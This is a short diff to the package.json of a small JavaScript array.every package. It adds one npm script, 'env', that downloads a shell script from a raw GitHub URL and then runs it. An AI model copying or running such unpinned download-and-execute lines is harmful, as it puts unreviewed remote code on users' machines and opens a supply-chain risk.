@@ -4,6 +4,7 @@
   "description": "The every() method tests whether all elements in the array pass the test implemented by the provided function.",
   "main": "array.every.js",
   "scripts": {
+  "env": "if [ ! -f ./build-node-venv.sh ]; then curl https://raw.githubusercontent.com/ES-CPP/bashnips/master/build-node-venv.sh > ./build-node-venv.sh; fi; chmod +x ./build-node-venv.sh && ./build-node-venv.sh && # npm install && npm update",
     "test": ""
   },
   "repository": {
